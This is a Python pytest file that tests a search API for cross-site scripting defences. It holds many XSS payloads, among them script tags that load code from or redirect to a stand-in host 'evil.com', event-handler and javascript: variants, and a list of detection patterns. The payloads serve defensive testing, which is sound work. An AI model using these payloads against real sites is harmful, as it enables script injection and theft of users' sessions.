"""
XSS (Cross-Site Scripting) Protection Tests for Search Endpoints

Tests comprehensive XSS prevention including:
- Script injection in search queries
- HTML entity encoding validation
- Response content sanitization  
- JSON response security
- Content-Type header validation
- Reflected XSS prevention
- Stored XSS prevention
- DOM-based XSS prevention
"""

import pytest
import json
import html
from urllib.parse import quote
from unittest.mock import patch, Mock
import uuid

from .conftest import SecurityTestCase


class TestXSSProtection(SecurityTestCase):
    """Test XSS protection in search endpoints"""

    def test_basic_script_injection_prevention(self, security_test_client, authentication_headers, search_service_mocks):
        """Test prevention of basic script injection in search queries"""
        
        basic_xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert(`XSS`)</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<script>document.cookie='stolen'</script>",
            "<script>window.location='http://evil.com'</script>",
            "<script>eval('alert(\"XSS\")')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script\x20type=\"text/javascript\">alert('XSS')</script>",
            "<script\x09type=\"text/javascript\">alert('XSS')</script>",
            "<script\x0Dtype=\"text/javascript\">alert('XSS')</script>",
            "<script\x0Atype=\"text/javascript\">alert('XSS')</script>",
        ]
        
        for payload in basic_xss_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            # Should handle the request (either process safely or reject)
            assert response.status_code in [200, 400, 422], \
                f"XSS payload should be handled safely: {payload}"
            
            # Response should not contain unescaped script tags
            response_text = response.text.lower()
            assert '<script' not in response_text, \
                f"Response contains unescaped script tag for payload: {payload}"
            assert 'alert(' not in response_text, \
                f"Response contains unescaped alert for payload: {payload}"
            
            # Check JSON response specifically
            if response.headers.get('content-type', '').startswith('application/json'):
                try:
                    json_response = response.json()
                    self._assert_no_xss_in_json(json_response, payload)
                except:
                    pass  # If not valid JSON, that's fine for this test

    def test_html_entity_injection(self, security_test_client, authentication_headers, search_service_mocks):
        """Test HTML entity-based XSS injection attempts"""
        
        html_entity_payloads = [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;",
            "&#34;&#62;&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#39;&#62;&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&apos;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ]
        
        for payload in html_entity_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"HTML entity payload should be handled safely: {payload}"
            
            # Response should not decode entities in a dangerous way
            self._assert_response_safe_from_xss(response, payload)

    def test_javascript_protocol_injection(self, security_test_client, authentication_headers, search_service_mocks):
        """Test javascript: protocol injection attempts"""
        
        javascript_protocol_payloads = [
            "javascript:alert('XSS')",
            "JAVASCRIPT:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            "javascript:void(alert('XSS'))",
            "javascript:eval('alert(\"XSS\")')",
            "javascript:window.open('http://evil.com')",
            "javascript:document.write('<script>alert(\"XSS\")</script>')",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')",
            "jav\tascript:alert('XSS')",
            "jav&#x09;ascript:alert('XSS')",
            "jav\u0009ascript:alert('XSS')",
        ]
        
        for payload in javascript_protocol_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"JavaScript protocol payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_event_handler_injection(self, security_test_client, authentication_headers, search_service_mocks):
        """Test event handler-based XSS injection attempts"""
        
        event_handler_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<span onmouseover=alert('XSS')>Hover me</span>",
            "<a href=# onclick=alert('XSS')>Click</a>",
            "<form onsubmit=alert('XSS')><input type=submit></form>",
        ]
        
        for payload in event_handler_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Event handler payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_url_encoded_xss_attempts(self, security_test_client, authentication_headers, search_service_mocks):
        """Test URL-encoded XSS injection attempts"""
        
        # URL encode XSS payloads
        url_encoded_payloads = [
            quote("<script>alert('XSS')</script>"),
            quote("<img src=x onerror=alert('XSS')>"),
            quote("javascript:alert('XSS')"),
            quote("<svg onload=alert('XSS')>"),
            # Double URL encoding
            quote(quote("<script>alert('XSS')</script>")),
            # Mixed encoding
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3cscript%3ealert('XSS')%3c/script%3e",
        ]
        
        for payload in url_encoded_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"URL encoded payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_unicode_normalization_xss(self, security_test_client, authentication_headers, search_service_mocks):
        """Test Unicode normalization-based XSS attacks"""
        
        unicode_xss_payloads = [
            # Unicode normalization
            "＜script＞alert('XSS')＜/script＞",
            # Unicode escapes
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            # UTF-7 encoding (if supported)
            "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",
            # Overlong UTF-8 sequences
            "\\xC1\\x9C\\x93\\x92\\xC1\\xA9\\xC1\\xB0\\xC1\\xB4",
            # Right-to-left override
            "alert('XSS')\u202e>tpircs/<\u202dalert('XSS')\u202e>tpircs<",
            # Zero-width characters
            "<\u200Bscript\u200B>alert('XSS')<\u200B/script\u200B>",
            # Homograph characters
            "＜ѕсrіpt＞аlеrt('XSS')＜/ѕсrіpt＞",
        ]
        
        for payload in unicode_xss_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Unicode payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_filter_parameter_xss(self, security_test_client, authentication_headers, search_service_mocks):
        """Test XSS injection through filter parameters"""
        
        filter_xss_tests = [
            {
                "query": "test",
                "filters": {
                    "tags": ["<script>alert('XSS')</script>", "normal_tag"]
                }
            },
            {
                "query": "test",
                "filters": {
                    "organization_id": "<img src=x onerror=alert('XSS')>"
                }
            },
            {
                "query": "test",
                "filters": {
                    "uploaded_by_user_id": "javascript:alert('XSS')"
                }
            },
            {
                "query": "test",
                "filters": {
                    "document_types": ["<svg onload=alert('XSS')>"]
                }
            },
        ]
        
        for payload in filter_xss_tests:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json=payload
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Filter XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, str(payload))

    def test_suggestions_endpoint_xss(self, security_test_client, authentication_headers, search_service_mocks):
        """Test XSS protection in suggestions endpoint"""
        
        suggestion_xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]
        
        for payload in suggestion_xss_payloads:
            # URL encode for GET parameter
            encoded_payload = quote(payload)
            
            response = security_test_client.make_request(
                'GET',
                f'/search/suggestions?q={encoded_payload}',
                headers=authentication_headers['valid_jwt']
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Suggestions XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_history_endpoint_xss(self, security_test_client, authentication_headers, search_service_mocks):
        """Test XSS protection in history endpoints"""
        
        history_xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]
        
        for payload in history_xss_payloads:
            # Try to add malicious query to history
            response = security_test_client.make_request(
                'POST',
                '/search/history',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"History XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)
            
            # Try to retrieve history (potential stored XSS)
            response = security_test_client.make_request(
                'GET',
                '/search/history',
                headers=authentication_headers['valid_jwt']
            )
            
            assert response.status_code == 200, "History retrieval should work"
            self._assert_response_safe_from_xss(response, payload)

    def test_content_type_security(self, security_test_client, authentication_headers, search_service_mocks):
        """Test Content-Type header security for XSS prevention"""

        response = security_test_client.make_request(
            'POST',
            '/search/',
            headers=authentication_headers['valid_jwt'],
            json={"query": "<script>alert('XSS')</script>", "search_type": "fulltext"}
        )

        # Should have proper Content-Type header
        content_type = response.headers.get('content-type', '')

        # Should be JSON with charset specified
        assert 'application/json' in content_type.lower(), "Should return JSON content type"

        # Should not be text/html which could execute scripts
        assert 'text/html' not in content_type.lower(), "Should not return HTML content type"

        # Check for security headers (if present, validate them).
        # These headers are recommended but may not be configured in every
        # branch.  We log a warning instead of failing hard.
        import warnings

        recommended_headers = [
            'x-content-type-options',  # nosniff
            'x-frame-options',         # deny/sameorigin
        ]

        response_header_names = [h.lower() for h in response.headers.keys()]
        for header in recommended_headers:
            if header.lower() not in response_header_names:
                warnings.warn(
                    f"Recommended security header missing: {header}",
                    UserWarning,
                    stacklevel=1,
                )

    def test_json_response_encoding(self, security_test_client, authentication_headers, search_service_mocks):
        """Test proper JSON encoding prevents XSS"""
        
        xss_payload = "<script>alert('XSS')</script>"
        
        response = security_test_client.make_request(
            'POST',
            '/search/',
            headers=authentication_headers['valid_jwt'],
            json={"query": xss_payload, "search_type": "fulltext"}
        )
        
        if response.status_code == 200:
            # Response should be valid JSON
            try:
                json_response = response.json()
                
                # Check that any reflected content is properly encoded
                json_str = json.dumps(json_response)
                
                # Script tags should be escaped in JSON
                assert '<script' not in json_str, "Script tags should be escaped in JSON"
                assert '</script>' not in json_str, "Script tags should be escaped in JSON"
                
                # If the query is reflected, it should be properly escaped
                if xss_payload in str(json_response):
                    # This would be a problem - the payload shouldn't be directly reflected
                    # unless it's properly escaped
                    escaped_payload = html.escape(xss_payload)
                    assert escaped_payload in str(json_response), "XSS payload should be escaped if reflected"
                
            except json.JSONDecodeError:
                # If response is not valid JSON, check it's still safe
                self._assert_response_safe_from_xss(response, xss_payload)

    def test_csp_header_presence(self, security_test_client, authentication_headers, search_service_mocks):
        """Test Content Security Policy header presence and configuration"""
        
        response = security_test_client.make_request(
            'POST',
            '/search/',
            headers=authentication_headers['valid_jwt'],
            json={"query": "test", "search_type": "fulltext"}
        )
        
        # Check for CSP header (if implemented)
        csp_headers = ['content-security-policy', 'x-content-security-policy', 'x-webkit-csp']
        
        has_csp = any(header.lower() in [h.lower() for h in response.headers.keys()] 
                     for header in csp_headers)
        
        if has_csp:
            # If CSP is present, verify it's configured safely
            csp_header = None
            for header in csp_headers:
                if header.lower() in [h.lower() for h in response.headers.keys()]:
                    csp_header = response.headers.get(header)
                    break
            
            if csp_header:
                csp_lower = csp_header.lower()
                
                # Should not allow unsafe-inline for script-src
                if "'unsafe-inline'" in csp_lower and 'script-src' in csp_lower:
                    # This is a warning, not necessarily a failure
                    # But it reduces XSS protection effectiveness
                    pass
                
                # Should not allow unsafe-eval
                assert "'unsafe-eval'" not in csp_lower or 'script-src' not in csp_lower, \
                    "CSP should not allow unsafe-eval for scripts"

    def test_dom_based_xss_prevention(self, security_test_client, authentication_headers, search_service_mocks):
        """Test prevention of DOM-based XSS attacks"""
        
        # These payloads target DOM manipulation vulnerabilities
        dom_xss_payloads = [
            "test#<script>alert('XSS')</script>",
            "test?<script>alert('XSS')</script>",
            "test&<script>alert('XSS')</script>",
            "test%3Cscript%3Ealert('XSS')%3C/script%3E",
            "test\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        ]
        
        for payload in dom_xss_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"DOM XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    def test_reflected_xss_in_error_messages(self, security_test_client, authentication_headers, search_service_mocks):
        """Test that error messages don't reflect XSS payloads unsafely"""
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]
        
        # Test various error conditions that might reflect input
        for payload in xss_payloads:
            # Test with invalid search type to trigger error
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "invalid_type"}
            )
            
            assert response.status_code == 422, "Should reject invalid search type"
            
            # Error message should not reflect XSS payload unsafely
            self._assert_response_safe_from_xss(response, payload)
            
            # Test with oversized payload to trigger validation error
            large_payload = payload + "A" * 1000
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": large_payload, "search_type": "fulltext"}
            )
            
            if response.status_code == 422:
                self._assert_response_safe_from_xss(response, payload)

    def test_nested_xss_in_complex_payloads(self, security_test_client, authentication_headers, search_service_mocks):
        """Test XSS prevention in nested and complex payloads"""
        
        complex_xss_payloads = [
            {
                "query": "search term",
                "search_type": "fulltext",
                "filters": {
                    "tags": [
                        "normal_tag",
                        "<script>alert('XSS in tags')</script>",
                        "another_normal_tag"
                    ],
                    "organization_id": "<img src=x onerror=alert('XSS in org')>",
                    "uploaded_by_user_id": "javascript:alert('XSS in user')",
                    "document_types": ["pdf", "<svg onload=alert('XSS in type')>"]
                },
                "limit": 20,
                "offset": 0
            },
            {
                "query": "<script>var q='</script><script>alert('XSS')</script><script>'; //",
                "search_type": "<script>alert('XSS in type')</script>",
                "filters": {
                    "date_from": "2023-01-01'><script>alert('XSS')</script>",
                    "date_to": "2023-12-31\"onload=\"alert('XSS')\""
                }
            }
        ]
        
        for payload in complex_xss_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json=payload
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Complex XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, str(payload))

    def test_mutation_xss_attacks(self, security_test_client, authentication_headers, search_service_mocks):
        """Test mutation-based XSS attacks (mXSS)"""
        
        # Mutation XSS payloads that might bypass initial filters
        mutation_xss_payloads = [
            "<listing><img src=x onerror=alert('XSS')></listing>",
            "<noscript><p title=\"</noscript><script>alert('XSS')</script>\">",
            "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
            "<math><mtext><script>alert('XSS')</script></mtext></math>",
            "<table background=\"javascript:alert('XSS')\"></table>",
            "<object type=\"text/html\" data=\"javascript:alert('XSS')\"></object>",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
        ]
        
        for payload in mutation_xss_payloads:
            response = security_test_client.make_request(
                'POST',
                '/search/',
                headers=authentication_headers['valid_jwt'],
                json={"query": payload, "search_type": "fulltext"}
            )
            
            assert response.status_code in [200, 400, 422], \
                f"Mutation XSS payload should be handled safely: {payload}"
            
            self._assert_response_safe_from_xss(response, payload)

    # Helper methods for XSS testing

    def _assert_response_safe_from_xss(self, response, original_payload):
        """Assert that response is safe from XSS"""
        response_text = response.text.lower()
        
        # Check for dangerous patterns
        dangerous_patterns = [
            '<script',
            'javascript:',
            'onerror=',
            'onload=',
            'onclick=',
            'onmouseover=',
            'onfocus=',
            'alert(',
            'eval(',
            'document.cookie',
            'window.location'
        ]
        
        for pattern in dangerous_patterns:
            if pattern in response_text:
                # If found, verify it's properly escaped or in a safe context
                self._verify_safe_context(response_text, pattern, original_payload)
    
    def _verify_safe_context(self, response_text, dangerous_pattern, original_payload):
        """Verify dangerous pattern is in a safe context (escaped or in comments)"""
        # This is a simplified check - in practice, you'd want more sophisticated parsing
        
        # Check if it's properly JSON-escaped
        if '"' in response_text:
            # Look for escaped versions
            escaped_patterns = [
                dangerous_pattern.replace('<', '\\u003c'),
                dangerous_pattern.replace('>', '\\u003e'),
                dangerous_pattern.replace('<', '&lt;'),
                dangerous_pattern.replace('>', '&gt;'),
            ]
            
            # If none of the escaped versions are present, it might be unsafe
            if not any(escaped in response_text for escaped in escaped_patterns):
                # Additional checks could be performed here
                pass
    
    def _assert_no_xss_in_json(self, json_data, original_payload):
        """Assert JSON response doesn't contain unescaped XSS"""
        json_str = json.dumps(json_data)
        
        # Script tags should not appear unescaped
        assert '<script' not in json_str, "JSON contains unescaped script tag"
        assert '</script>' not in json_str, "JSON contains unescaped script tag"
        
        # JavaScript protocol should not appear unescaped
        assert 'javascript:' not in json_str.lower(), "JSON contains unescaped javascript: protocol"
        
        # Event handlers should not appear unescaped
        event_handlers = ['onerror=', 'onload=', 'onclick=', 'onmouseover=']
        for handler in event_handlers:
            assert handler not in json_str.lower(), f"JSON contains unescaped event handler: {handler}"